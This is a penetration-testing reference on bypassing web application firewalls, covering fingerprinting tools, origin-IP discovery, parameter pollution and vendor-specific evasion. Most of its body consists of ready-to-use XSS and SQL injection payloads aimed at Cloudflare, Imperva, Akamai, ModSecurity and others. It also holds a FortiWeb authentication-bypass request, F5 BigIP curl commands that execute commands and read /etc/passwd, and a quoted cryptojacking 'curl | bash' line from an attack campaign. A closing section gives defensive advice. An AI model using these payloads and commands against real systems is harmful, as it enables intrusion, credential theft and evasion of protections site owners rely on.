# WAFs (Web Application Firewalls)

## Overview

Web Application Firewalls (WAFs) are security solutions designed to protect web applications by filtering and monitoring HTTP traffic between a web application and the internet. They operate by inspecting requests and responses, applying rule sets to detect and block malicious payloads such as SQL injection (SQLi), Cross-Site Scripting (XSS), and other OWASP Top 10 vulnerabilities.

Despite their critical role in defense-in-depth strategies, WAFs are not impervious to bypass techniques. Attackers continuously develop methods to evade detection by exploiting parsing discrepancies, misconfigurations, protocol-level inconsistencies, and even vulnerabilities within the WAF appliances themselves. Understanding these bypass techniques is essential for both penetration testers and defenders to properly assess and fortify web application security.

---

## WAF Detection and Fingerprinting

Before attempting to bypass a WAF, it is crucial to identify its presence and type. Different WAFs have distinct behaviors, signatures, and bypass opportunities.

### Automated Detection Tools

```
# Fast detection with wafw00f
wafw00f https://example.com

# Comprehensive detection with whatwaf
whatwaf https://example.com

# Nmap WAF detection scripts
nmap --script=http-waf-fingerprint victim.com
nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 victim.com
nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro" victim.com

# DNS history analysis for origin IP discovery
# https://github.com/vincentcox/bypass-firewalls-by-DNS-history
bash bypass-firewalls-by-DNS-history.sh -d example.com

# Cloudflare origin IP discovery
python3 cloudflair.py domain.com
# https://github.com/mandatoryprogrammer/cloudflare_enum
cloudflare_enum.py disney.com
```

### Manual Identification Techniques

```
# DNS resolution to identify potential proxy/CDN presence
dig +short target.com

# IP reputation and hosting provider check
curl -s https://ipinfo.io/<ip address> | jq -r '.org'

# DNS history for original IP leakage
https://whoisrequest.com/history/
https://viewdns.info/iphistory/?domain=domain.com
```

---

## Origin IP Discovery - The Most Critical Bypass

The most effective WAF bypass technique often does not involve evading the WAF at all—it involves completely circumventing it by identifying and directly attacking the origin server. Many organizations configure their WAF or CDN to proxy traffic but fail to properly restrict access to the origin IP address, leaving it exposed.

### Real-World Case: Akamai WAF Bypass via DNS Origin IP Leak (2026)

A critical vulnerability report from HITCON ZeroDay (ZD-2026-00539) demonstrated a complete bypass of Akamai WAF protection . The ezorder online ordering system at `ezorder.8way.com.tw` was protected by Akamai WAF, but the origin server's real IP address was leaked through the `mail` subdomain's DNS records. By obtaining the exposed origin IP, an attacker could:

1. Forge the `Host` header to match the protected domain
2. Bypass the WAF entirely by connecting directly to the origin server
3. Access the backend Microsoft Exchange OWA login interface, which should have been protected

This case highlights a fundamental weakness: a WAF is only effective if all traffic routes through it. Direct origin access nullifies all WAF protections regardless of their sophistication.

### Common Origin IP Discovery Vectors

- **DNS History**: Historical A records often reveal the origin IP before CDN/WAF implementation
- **Subdomain Enumeration**: Subdomains like `dev`, `stage`, `origin`, `mail`, `direct` may bypass WAF protections
- **SSL Certificate Transparency Logs**: Certificates can reveal origin IPs
- **Email Headers**: Emails sent directly from the origin server may leak IP addresses
- **Shodan/Censys Searches**: Internet-wide scanning can locate exposed origin services

### Recommended Discovery Commands

```
# Check DNS history services
https://viewdns.info/iphistory/
https://whoisrequest.com/history/

# Search for origin subdomains
dev.domain.com
stage.domain.com
origin.domain.com
origin-sub.domain.com
ww1.domain.com
ww2.domain.com
www.domain.uk/jp/

# Certificate transparency search
https://crt.sh/?q=%25.domain.com
```

### Mitigation for Defenders

According to Akamai's security guidance, organizations must implement origin access controls such as allowlisting only the CDN/WAF provider's IP ranges on their perimeter firewall . Akamai's Site Shield feature provides this capability, but customers must actively configure it. This is not a vulnerability in the WAF itself but a misconfiguration that vendors warn about during onboarding.

---

## WAF Evasion Through Parsing Discrepancies

Modern WAF bypass research has demonstrated that parsing differences between the WAF engine and the backend application server represent a fertile ground for evasion.

### Parameter Pollution Bypass (70.6% Success Rate)

Research conducted by Ethiack and reported in September 2025 tested 17 different WAF configurations across major cloud providers, revealing that sophisticated parameter pollution techniques achieved a 70.6% bypass rate compared to only 17.6% for simple injection attempts .

The technique exploits how different frameworks handle multiple parameters with the same name:

| Framework | Input | Output Behavior |
|-----------|-------|-----------------|
| ASP.NET | `param=val1&param=val2` | `param=val1,val2` (comma concatenation) |
| ASP Classic | `param=val1&param=val2` | `param=val1,val2` |
| Golang net/http | `param=val1&param=val2` | `param=['val1','val2']` (array) |
| Python (Zope) | `param=val1&param=val2` | `param=['val1','val2']` (array) |
| Node.js | `param=val1&param=val2` | `param=val1,val2` (comma concatenation) |

#### ASP.NET XSS Bypass Example

When ASP.NET receives `/?q=1'&q=alert(1)&q='2`, it concatenates the values to form `1',alert(1),'2`. The JavaScript comma operator allows multiple expressions to execute sequentially within a single statement, making this syntactically valid JavaScript that executes `alert(1)` when inserted into a vulnerable context.

#### Evasion Payloads by Complexity

| Payload Type | Example | Success Rate |
|--------------|---------|---------------|
| Simple Injection | `q=';alert(1),'` | 17.6% |
| Pollution + Semicolon | `q=1'+1;let+asd=window&q=def="al"+'ert'` | 52.9% |
| Pollution + Line Breaks | `q=1'%0aasd=window&q=def="al"+"ert"` | 70.6% |

#### Azure WAF Specific Bypass

Azure WAF was defeated using the payload `test\\';alert(1);//` which exploits parsing discrepancies in escaped character handling between the WAF pattern matching engine and JavaScript interpretation .

#### Imperva SecureSphere WAF Bypass (CVE-2023-50969)

A critical vulnerability (CVSS 9.8) in Thales Imperva SecureSphere WAF allowed attackers to bypass security rules by manipulating the `Content-Encoding` header of HTTP requests . By crafting POST requests with specific encoding headers, attackers could perform SQL injection and XSS attacks that would otherwise be blocked. Imperva released an Application Defense Center (ADC) update on February 26, 2024, to address this issue.

#### Imperva WAF XSS Bypass (October 2024)

A publicly disclosed bypass for Imperva WAF uses the payload:
```
<details/open/id=""e;"ontoggle=[JS]>
```
This technique leverages the `details` HTML tag with the `ontoggle` event to execute JavaScript .

---

## Cloudflare WAF Bypasses

Cloudflare is one of the most widely used WAF/CDN providers, and numerous bypass techniques have been discovered and documented.

### Cloudflare WAF Bypass Example (December 2024)

A security researcher successfully bypassed Cloudflare WAF protection during a bug bounty engagement using the payload:
```
<a href="//e..l.com">XSS</a>
```
The payload reflected on the website's page, and when clicked, redirected to an external domain, proving the XSS vulnerability was exploitable despite Cloudflare's defenses .

### Additional Cloudflare Bypass Payloads

```
# Multiple encoding and obfuscation techniques
<!<script>alert(1)</script>

# Tab and newline injection
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>

# HTML entity encoding
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';>

# Noembed bypass
<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>

# Encoded JavaScript
<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'
```

### Cloudflare WARP Abuse for Attack Anonymization

Darktrace (formerly Cado Security) researchers discovered that attackers are abusing Cloudflare's free WARP VPN service to launch attacks while evading detection . WARP traffic originates from Cloudflare's IP ranges (`104.28.0.0/16`), which network administrators often trust or overlook in firewall rules.

#### Real-World Attack Campaigns Using WARP

**SSWW Cryptojacking Campaign (February 2024 - Present)** : Attackers use Cloudflare WARP to mask their true origin while compromising exposed Docker instances. The attack flow:

1. Create a container with elevated permissions and host access
2. Execute `chroot /h bash -c "curl -k https://85[.]209.153.27:58282/ssww | bash"`
3. Download XMRig cryptocurrency miner configured with wallet `44EP4MrMADSYSxmN7r2EERgqYBeB5EuJ3FBEzBrczBRZZFZ7cKotTR5airkvCm2uJ82nZHu8U3YXbDXnBviLj3er7XDnMhP`
4. Install rootkit via `/etc/ld.so.preload` for process hiding
5. Establish persistence via SystemD service

The attacker has earned approximately 9.57 XMR (~$1,269 USD) from this campaign. Traffic consistently originates from Cloudflare's Zagreb, Croatia data center, suggesting the attacker's scan server is located in Croatia.

**SSH Brute Force Campaigns**: Since 2022, thousands of SSH attacks have originated from Cloudflare WARP addresses, with surges reaching thousands per month. Attackers have migrated from traditional VPS providers to WARP to take advantage of Cloudflare's "clean" IP ranges and the higher likelihood of these ranges being allowed through firewalls .

#### Mitigation for Defenders

Network administrators should NOT blindly allow all Cloudflare IP ranges. The specific recommendation: ensure `104.28.0.0/16` is not permitted in firewall rules unless explicitly required and properly restricted .

---

## FortiWeb WAF Vulnerability (CVE-2025-64446)

In November 2025, a critical authentication bypass vulnerability in Fortinet's FortiWeb WAF (CVE-2025-64446, CVSS 9.8) was discovered being actively exploited in the wild . The vulnerability was exploited for over a month before a CVE was assigned.

### Root Cause

The vulnerability combines two flaws:
1. **Path Traversal**: Allows access to the `fwbcgi` executable via `%3f/../../../../../cgi-bin/fwbcgi`
2. **Authentication Bypass**: Manipulation of the `CGIINFO` HTTP header to impersonate an existing administrator

### Proof of Concept Exploit

The exploit sends a crafted HTTP POST request to the vulnerable endpoint:
```
POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi HTTP/1.1
CGIINFO: <base64-encoded JSON claiming admin privileges>
```

The `CGIINFO` header contains Base64-encoded JSON that tells the application to process the request as if initiated by an authenticated administrator (typically the default "admin" account).

### Observed Attack Patterns

In-the-wild attacks have created admin accounts with usernames including:
- `Testpoint`
- `trader1`
- `test1234point`

### Affected Versions

- FortiWeb 8.0.0 through 8.0.1
- FortiWeb 7.6.0 through 7.6.4
- FortiWeb 7.4.0 through 7.4.9
- FortiWeb 7.2.0 through 7.2.11
- FortiWeb 7.0.0 through 7.0.11

### Mitigation

Upgrade to patched versions:
- FortiWeb 8.0.2 or above
- FortiWeb 7.6.5 or above
- FortiWeb 7.4.10 or above
- FortiWeb 7.2.12 or above
- FortiWeb 7.0.12 or above

Organizations should also investigate for signs of compromise including unexpected administrator accounts and suspicious HTTP POST requests to the vulnerable endpoint. CISA has added this vulnerability to its Known Exploited Vulnerabilities (KEV) catalog .

---

## ModSecurity and OWASP CRS Bypasses

ModSecurity with OWASP Core Rule Set (CRS) is the most widely used open-source WAF. Several bypass techniques and vulnerabilities have been documented.

### SQL Injection Bypass via Comment Characters (CVE-2020-22669)

A SQL injection bypass vulnerability exists in ModSecurity owasp-modsecurity-crs 3.2.0 at Paranoia Level 1 (PL1). Attackers can use comment characters (`#`, `--`, `/* */`) and variable assignments in SQL syntax to bypass ModSecurity WAF protection .

### SQL Injection Bypass via Function Name Manipulation (CVE-2018-16384)

A SQL injection bypass (PL1 bypass) exists in OWASP ModSecurity Core Rule Set through v3.1.0-rc3 via the pattern `{ab}` where `a` is a special function name (such as `if`) and `b` is the SQL statement to be executed .

### Libinjection False Positive Issues

The libinjection library used by ModSecurity CRS for SQLi detection can produce false positives that reveal detection logic. For example, the fingerprint 'sos' (representing `"1" * "1"`) was triggered by legitimate XML content in WFS requests .

### ModSecurity XSS Bypass Payloads

```
# Null byte injection
<scr%00ipt>alert(document.cookie)</scr%00ipt>

# Vertical tab obfuscation
onmouseover%0B=
ontoggle%0B%3D

# Double encoding
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert("123")>

# Payload from real-world testing
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

### ModSecurity SQLi Bypass Payloads

```
# Union-based injection with null byte and vertical tab
1+uni%0Bon+se%0Blect+1,2,3
```

---

## Vendor-Specific Bypass Techniques

### Akamai WAF

In addition to the origin IP discovery method documented above, Akamai-specific bypass techniques include:

```
# Subdomain patterns that may bypass WAF
origin.sub.domain.com
origin-sub.domain.com

# Custom header to reveal cache behavior
Pragma: akamai-x-get-true-cache-key

# JavaScript constructor injection
{{constructor.constructor(alert`1`)()}}

# Comment-based SQL injection
\');confirm(1);//

# MID function obfuscation
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

### Imperva Incapsula WAF

Comprehensive bypass techniques have been documented including:

**SQL Injection via Parameter Pollution** :
```
http://www.website.com/page.asp?a=nothing'/*&a=*/or/*&a=*/1=1/*&a=*/--+-
http://www.website.com/page.asp?a=nothing'/*&a%00=*/or/*&a=*/1=1/*&a%00=*/--+-
```

**XSS via Multiple Encoding Layers** :
```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```

**Complex JavaScript Obfuscation** :
A multi-kilobyte payload using JavaScript self-modifying code has been documented for Imperva bypass (see the original content for the complete obfuscated payload).

**Iframe Event Bypass** :
```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``";'>
```

**Function Constructor Bypass** :
```
<img/src=q onerror='new Function`al\ert\`1\``'>
```

### F5 BigIP WAF

**Remote Code Execution** :
```
curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
```

**File Read** :
```
curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
```

**XSS Payloads** :
```
<body style="height:1000px" onwheel=alert("123")>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow=alert("123")>
<body style="height:1000px" onwheel="[JS-F**k Payload]">
```

### Aqtronix WebKnight WAF

**SQL Injection** :
```
0 union(select 1,@@hostname,@@datadir)
0 union(select 1,username,password from(users))
```

**XSS** :
```
<details ontoggle=alert(document.cookie)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

### Wordfence WAF

```
<meter onmouseover="alert(1)">
'">><div><meter onmouseover="alert(1)"</div>">
>><marquee loop=1 width=0 onfinish=alert(1)>
```

---

## RCE WAF Globbing Bypass

When command execution is possible but spaces and certain characters are blocked, globbing patterns can be used:

```
# Standard command with spaces
/usr/bin/cat /etc/passwd

# Globbing bypass
/???/???/c?t$IFS/???/p?s?w?

# Variable-based bypass
cat /etc$u/p*s*wd$u
```

---

## SQL Injection Bypass for FAIL2BAN

```
(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

---

## General Bypass Techniques and Resources

### Universal Bypass Payload Examples

```
# Multi-line JavaScript injection
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)

# Multi-context bypass
javascript:"""/*'/*`/* →<html " onmouseover=/*<svg/*/onload=alert()//>
```

### Useful Resources

- **Bypass Collections**: [https://github.com/0xInfection/Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
- **Community Bypasses**: [https://github.com/waf-bypass-maker/waf-community-bypasses](https://github.com/waf-bypass-maker/waf-community-bypasses)
- **XSS Payload Collection**: [https://github.com/Walidhossain010/WAF-bypass-xss-payloads](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)
- **pFuzz Bypasser**: [https://github.com/RedSection/pFuzz](https://github.com/RedSection/pFuzz)
- **Nemesida WAF Bypass**: [https://github.com/nemesida-waf/waf-bypass](https://github.com/nemesida-waf/waf-bypass)
- **WAF-Bypass.com**: [https://waf-bypass.com](https://waf-bypass.com)

---

## Defense Recommendations

Based on the real-world bypass techniques documented above, organizations should implement the following defensive measures:

1. **Origin Protection**: Never expose origin IP addresses. Implement strict firewall rules allowing only WAF/CDN IP ranges. Regularly audit DNS records for leaks.

2. **Regular Updates**: WAF appliances and rule sets must be kept current. The FortiWeb CVE-2025-64446 and Imperva CVE-2023-50969 cases demonstrate that unpatched WAFs become entry points rather than defenses.

3. **Framework-Specific Parsing**: WAFs should implement parsing logic that mirrors the protected application's framework. Generic pattern matching is insufficient against parameter pollution attacks.

4. **Defense in Depth**: Do not rely solely on WAF protection. Implement input validation, output encoding, parameterized queries, and other application-level security controls.

5. **Monitoring and Detection**: Monitor for the bypass techniques described above, including unusual header combinations (e.g., `CGIINFO`), parameter pollution patterns, and direct origin access attempts.

6. **Network Segmentation**: As demonstrated in the Cloudflare WARP abuse cases, restrict outbound and inbound traffic from trusted ASNs that could be abused for attack anonymization .

7. **WAF Rule Tuning**: Paranoia levels and custom rules should be tuned for the specific application. Default configurations are well-documented and widely tested by attackers.
